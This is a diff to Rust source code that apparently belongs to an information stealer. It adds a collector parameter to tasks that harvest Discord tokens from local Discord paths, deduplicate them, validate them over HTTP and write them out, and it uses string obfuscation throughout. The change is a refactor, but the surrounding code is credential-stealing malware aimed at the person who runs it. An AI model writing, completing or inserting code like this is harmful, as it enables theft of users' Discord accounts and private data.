@@ -3,6 +3,7 @@ use alloc::format;
 use alloc::string::{String, ToString};
 use alloc::sync::Arc;
 use alloc::vec::Vec;
+use collector::atomic::AtomicCollector;
 use core::fmt::{Display, Formatter};
 use obfstr::obfstr as s;
 use requests::{Request, RequestBuilder, ResponseBodyExt};
@@ -17,7 +18,8 @@ struct TokenValidationTask {
 }
 
 impl Task for TokenValidationTask {
-    unsafe fn run(&self, parent: &Path) {
+    // TODO: Impl collector
+    unsafe fn run(&self, parent: &Path, _: &AtomicCollector) {
         let Some(info) = get_token_info(self.token.clone()) else {
             return
         };
@@ -47,8 +49,8 @@ impl TokenWriterTask {
 }
 
 impl Task for TokenWriterTask {
-    unsafe fn run(&self, parent: &Path) {
-        self.inner.run(parent);
+    unsafe fn run(&self, parent: &Path, collector: &AtomicCollector) {
+        self.inner.run(parent, collector);
     }
 }
 
@@ -57,7 +59,7 @@ pub(super) struct DiscordTask;
 impl Task for DiscordTask {
     parent_name!("Discord");
 
-    unsafe fn run(&self, parent: &Path) {
+    unsafe fn run(&self, parent: &Path, collector: &AtomicCollector) {
         let mut tokens = collect_tokens(&get_discord_paths());
         tokens.sort();
         tokens.dedup();
@@ -66,7 +68,7 @@ impl Task for DiscordTask {
             return
         }
 
-        TokenWriterTask::new(tokens).run(parent);
+        TokenWriterTask::new(tokens).run(parent, collector);
     }
 }
 
